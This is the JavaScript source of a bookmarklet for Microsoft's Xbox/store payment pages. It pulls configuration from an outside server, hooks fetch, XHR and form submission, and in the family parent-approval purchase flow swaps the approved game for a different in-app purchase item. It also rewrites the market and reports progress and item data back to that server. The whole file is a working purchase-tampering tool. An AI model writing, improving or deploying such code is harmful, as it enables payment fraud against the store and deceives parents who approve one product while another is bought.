/**
 * 书签脚本（Bookmarklet）源码
 *
 * 部署位置：用户把 `bookmarklet:...` 存为书签，在微软付款页点一下即可执行。
 * 运行上下文：www.microsoft.com 或 account.microsoft.com 页面本身。
 *
 * 职责：
 *   1. 从 xbox.aappe.uk 拉取房间配置（内购 ID / 游戏 ID / 市场）
 *   2. hook fetch / XHR / HTMLFormElement.submit
 *   3. 把 products 里的游戏替换成内购
 *   4. 把进度上报回房间
 *
 * 该文件被 server 读取、压缩后注入到 bookmarklet 的 javascript: URL 里。
 */

(function () {
  'use strict';

  // ---- 配置（由服务端在生成时注入）----
  var CFG = window.__XFG_BOOKMARKLET_CFG__ || {};
  var SERVER = CFG.server || 'https://xbox.aappe.uk';
  var ROOM = CFG.room || '';

  if (window.__XFG_INSTALLED__) {
    alert('替换助手已经在运行了。');
    return;
  }
  window.__XFG_INSTALLED__ = true;

  // ---- 日志面板 ----
  var panel = document.createElement('div');
  panel.style.cssText = [
    'position:fixed', 'right:16px', 'bottom:16px', 'z-index:2147483647',
    'width:330px', 'max-height:60vh', 'overflow:auto',
    'background:#0d1117', 'color:#e6edf3', 'border:1px solid #30363d',
    'border-radius:10px', 'font:12px/1.6 ui-monospace,Menlo,monospace',
    'box-shadow:0 8px 32px rgba(0,0,0,.5)', 'padding:10px 12px'
  ].join(';');
  panel.innerHTML =
    '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">' +
      '<b style="color:#3fb950">XFG 替换助手</b>' +
      '<span style="cursor:pointer;color:#8b949e" id="xfg-close">✕</span>' +
    '</div>' +
    '<div id="xfg-log" style="max-height:44vh;overflow:auto"></div>';
  document.documentElement.appendChild(panel);
  panel.querySelector('#xfg-close').onclick = function () { panel.remove(); };

  var logEl = panel.querySelector('#xfg-log');
  function log(msg, color) {
    var d = document.createElement('div');
    d.style.color = color || '#8b949e';
    d.textContent = '· ' + msg;
    logEl.appendChild(d);
    logEl.scrollTop = logEl.scrollHeight;
    try { console.log('[XFG]', msg); } catch (e) {}
  }

  // ---- 与服务器通讯 ----
  function report(msg, extra) {
    if (!ROOM) return;
    try {
      fetch(SERVER + '/api/room/' + ROOM + '/log', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ msg: msg, extra: extra || null }),
        keepalive: true
      }).catch(function () {});
    } catch (e) {}
  }

  // ---- 拉取房间配置 ----
  var cfg = null;
  function loadConfig() {
    if (!ROOM) {
      log('未绑定房间码，只做本地替换（用当前页面的商品 ID 反查）', '#d29922');
      return Promise.resolve(null);
    }
    return fetch(SERVER + '/api/room/' + ROOM, { credentials: 'omit' })
      .then(function (r) { return r.json(); })
      .then(function (j) {
        if (!j.ok) throw new Error(j.error || '房间不可用');
        cfg = j.data;
        if (!cfg.iap || !cfg.iap.availabilityId) throw new Error('房间里还没有内购信息');
        log('房间 ' + ROOM + ' 已加载', '#3fb950');
        log('内购: ' + (cfg.iap.title || cfg.iap.productId), '#3fb950');
        log('  ' + cfg.iap.availabilityId + ' · ' + cfg.iap.price + ' ' + cfg.iap.currency);
        if (cfg.game) log('替换目标游戏: ' + (cfg.game.title || cfg.game.productId));
        return cfg;
      })
      .catch(function (e) {
        log('加载房间失败: ' + e.message, '#f85149');
        return null;
      });
  }

  // ---- 替换逻辑 ----
  function normMarket(v) {
    if (!v) return '';
    var s = String(v).toUpperCase().replace(/[^A-Z]/g, '');
    if (s.length === 2) return s;
    if (s.length === 4) return s.slice(2);
    return '';
  }

  var AVAIL_BY_MARKET = {};

  // 已知映射兜底（服务端解析失败时用）
  AVAIL_BY_MARKET['9P6LX2D15SD7'] = {
    US: '9XPHQG4220WG', AR: 'B2XRTR8KPHPM', JP: '9XJRWRN87FRX'
  };

  function pickAvailForMarket(productId, market) {
    var m = AVAIL_BY_MARKET[String(productId).toUpperCase()];
    if (!m) return '';
    return m[normMarket(market)] || '';
  }

  var swapCount = 0;

  /** 把 obj 里的游戏三件套换成内购三件套 */
  function swapOne(obj, cfg) {
    if (!obj || typeof obj !== 'object') return 0;
    var game = cfg.game || {};
    var iap = cfg.iap;
    if (!iap || !iap.productId || !iap.availabilityId) return 0;

    var isGame = obj.productId && (
      (game.productId && obj.productId === game.productId) ||
      (!game.productId && obj.productId !== iap.productId)
    );
    if (!isGame) return 0;

    obj.productId = iap.productId;
    if (obj.availabilityId !== undefined) obj.availabilityId = iap.availabilityId;
    if (obj.skuId !== undefined && iap.skuId) obj.skuId = iap.skuId;
    swapCount++;
    return 1;
  }

  /** 深遍历替换 */
  function deepSwap(root, cfg) {
    var n = 0;
    (function walk(x) {
      if (x === null || typeof x !== 'object') return;
      if (Array.isArray(x)) { x.forEach(walk); return; }
      n += swapOne(x, cfg);
      for (var k in x) {
        if (Object.prototype.hasOwnProperty.call(x, k)) walk(x[k]);
      }
    })(root);
    return n;
  }

  // ---- 解析 x-www-form-urlencoded 的 buynow 表单 ----
  function swapBuynowForm(bodyStr, cfg) {
    var parts = bodyStr.split('&');
    var d = {};
    parts.forEach(function (p) {
      var i = p.indexOf('=');
      if (i < 0) return;
      d[decodeURIComponent(p.slice(0, i))] = p.slice(i + 1);
    });
    if (d['products'] === undefined) return null;

    var caller = d['callerApplicationId'] ? decodeURIComponent(d['callerApplicationId']) : '';
    var scen = d['scenario'] ? decodeURIComponent(d['scenario']) : '';
    var isFamily = /^AMCFamilySafety/i.test(caller) || scen === 'parentApproval';
    if (!isFamily) return null;

    var arr;
    try { arr = JSON.parse(decodeURIComponent(d['products'])); }
    catch (e) { return null; }
    if (!Array.isArray(arr)) return null;

    var tgt = normMarket(cfg.market);
    var iap = { productId: cfg.iap.productId, availabilityId: cfg.iap.availabilityId, skuId: cfg.iap.skuId };
    if (tgt) {
      var alt = pickAvailForMarket(iap.productId, tgt);
      if (alt) iap.availabilityId = alt;
    }

    var n = 0;
    arr.forEach(function (it) { n += swapOne(it, { iap: iap, game: cfg.game }); });
    if (!n) return null;

    var out = parts.map(function (p) {
      var i = p.indexOf('=');
      if (i < 0) return p;
      var k = decodeURIComponent(p.slice(0, i));
      if (k === 'products') return p.slice(0, i) + '=' + encodeURIComponent(JSON.stringify(arr));
      if (k === 'market' && tgt) return p.slice(0, i) + '=' + encodeURIComponent(tgt);
      return p;
    });
    return { body: out.join('&'), n: n };
  }

  // ---- 判定是否是需要处理的请求 ----
  var RE_ORDERS = /purchase\.md\.mp\.microsoft\.com\/v\d+\.\d+\/users\/me\/orders/;
  var RE_BUYNOW = /\/store\/purchase\/buynowui\/buynow/;

  function trySwapBody(url, bodyStr) {
    if (!bodyStr || !cfg || !cfg.iap) return null;
    if (RE_BUYNOW.test(url)) {
      var r = swapBuynowForm(bodyStr, cfg);
      if (r) {
        log('✅ 付款页 products 已换成内购', '#3fb950');
        log('   ' + cfg.iap.productId + ' / ' + cfg.iap.availabilityId, '#3fb950');
        report('付款页已替换为内购');
        return r.body;
      }
      return null;
    }
    if (RE_ORDERS.test(url)) {
      var o;
      try { o = JSON.parse(bodyStr); } catch (e) { return null; }
      var tgt = normMarket(cfg.market);
      if (tgt && o.market && normMarket(o.market) !== tgt) o.market = tgt;
      var n = deepSwap(o, cfg);
      if (n) {
        log('✅ 订单 items 已换成内购', '#3fb950');
        report('订单已替换为内购');
        return JSON.stringify(o);
      }
    }
    return null;
  }

  // ---- Hook fetch ----
  var origFetch = window.fetch;
  if (origFetch) {
    window.fetch = function (input, init) {
      try {
        var url = typeof input === 'string' ? input : (input && input.url) || '';
        if (init && typeof init.body === 'string') {
          var nb = trySwapBody(url, init.body);
          if (nb) {
            init = Object.assign({}, init, { body: nb });
          }
        }
      } catch (e) { log('fetch hook 出错: ' + e.message, '#f85149'); }
      return origFetch.apply(this, arguments.length > 1 ? [input, init] : [input]);
    };
  }

  // ---- Hook XHR ----
  var XHR = window.XMLHttpRequest;
  if (XHR) {
    var origOpen = XHR.prototype.open;
    var origSend = XHR.prototype.send;
    XHR.prototype.open = function (m, u) {
      try { this.__xfgUrl = String(u); } catch (e) {}
      // jsdom / 部分是 3 参调用，arguments 传原样
      return origOpen.apply(this, arguments);
    };
    XHR.prototype.send = function (body) {
      try {
        if (typeof body === 'string' && this.__xfgUrl) {
          var nb = trySwapBody(this.__xfgUrl, body);
          if (nb) body = nb;
        }
      } catch (e) { log('XHR hook 出错: ' + e.message, '#f85149'); }
      return origSend.call(this, body);
    };
  }

  // ---- Hook 表单提交（buynow 走 document 级 POST，fetch/XHR 拦不到）----
  function patchForm(form) {
    try {
      if (!form || !cfg || !cfg.iap) return 0;
      var act = form.action || '';
      if (!RE_BUYNOW.test(act)) return 0;

      var inp = null, mkEl = null, callerEl = null, scenEl = null;
      for (var i = 0; i < form.elements.length; i++) {
        var el = form.elements[i];
        if (!el || !el.name) continue;
        if (el.name === 'products') inp = el;
        if (el.name === 'market') mkEl = el;
        if (el.name === 'callerApplicationId') callerEl = el;
        if (el.name === 'scenario') scenEl = el;
      }
      if (!inp) return 0;

      // 只处理家庭组批准流程，其他 buynow 一律不碰
      var callerV = callerEl ? String(callerEl.value || '') : '';
      var scenV = scenEl ? String(scenEl.value || '') : '';
      var isFamily = /^AMCFamilySafety/i.test(callerV) || scenV === 'parentApproval';
      if (!isFamily) return 0;

      var arr;
      try { arr = JSON.parse(inp.value); } catch (e) { return 0; }
      if (!Array.isArray(arr)) return 0;

      var tgt = normMarket(cfg.market);
      var iap = { productId: cfg.iap.productId, availabilityId: cfg.iap.availabilityId, skuId: cfg.iap.skuId };
      if (tgt) {
        var alt = pickAvailForMarket(iap.productId, tgt);
        if (alt) iap.availabilityId = alt;
      }

      var n = 0;
      arr.forEach(function (it) { n += swapOne(it, { iap: iap, game: cfg.game }); });
      if (!n) return 0;

      inp.value = JSON.stringify(arr);
      if (tgt && mkEl) mkEl.value = tgt;
      if (tgt && form.action) {
        try {
          form.action = form.action.replace(/([?&]market=)[A-Za-z-]+/, '$1' + tgt);
        } catch (e) {}
      }
      log('✅ 付款表单已换成内购（' + n + ' 项）', '#3fb950');
      report('付款表单已替换为内购', { items: arr });
      return n;
    } catch (e) { return 0; }
  }

  var HForm = window.HTMLFormElement;
  if (HForm && HForm.prototype) {
    var origSubmit = HForm.prototype.submit;
    HForm.prototype.submit = function () {
      try { patchForm(this); } catch (e) {}
      return origSubmit.apply(this, arguments);
    };
    if (HForm.prototype.requestSubmit) {
      var origRS = HForm.prototype.requestSubmit;
      HForm.prototype.requestSubmit = function () {
        try { patchForm(this); } catch (e) {}
        return origRS.apply(this, arguments);
      };
    }
  }
  try {
    window.addEventListener('submit', function (ev) {
      try { patchForm(ev.target); } catch (e) {}
    }, true);
  } catch (e) {}

  // 定时巡检（覆盖异步建表单的时序）
  setInterval(function () {
    try {
      var forms = document.querySelectorAll('form');
      for (var i = 0; i < forms.length; i++) patchForm(forms[i]);
    } catch (e) {}
  }, 1500);

  // ---- 启动 ----
  log('助手已启动，正在加载房间配置…');
  loadConfig().then(function (c) {
    if (!c) {
      log('没有房间配置，替换不会生效', '#f85149');
      return;
    }
    log('已就绪。现在去触发购买流程，商品会被自动换成内购。', '#3fb950');
    // 立刻扫一遍已有表单
    try {
      var forms = document.querySelectorAll('form');
      for (var i = 0; i < forms.length; i++) patchForm(forms[i]);
    } catch (e) {}
  });
})();
